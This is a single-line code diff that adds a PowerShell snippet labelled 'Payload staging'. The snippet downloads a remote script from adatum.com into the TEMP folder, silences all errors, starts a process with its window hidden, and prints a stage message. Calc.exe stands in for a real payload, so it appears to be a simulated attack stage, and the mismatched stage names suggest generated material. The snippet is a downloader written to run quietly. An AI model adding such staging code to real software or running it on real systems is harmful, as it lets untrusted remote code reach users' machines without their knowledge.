@@ -1,0 +1,1 @@
+<# Payload staging #> $TargetUrl = 'http://adatum.com/stage1.ps1'; $DropPath = "$env:TEMP\stage2.bin"; $ConnectionTimeout = 43; Invoke-WebRequest -Uri $TargetUrl -OutFile $DropPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue; Write-Output "stage 14 initialized"
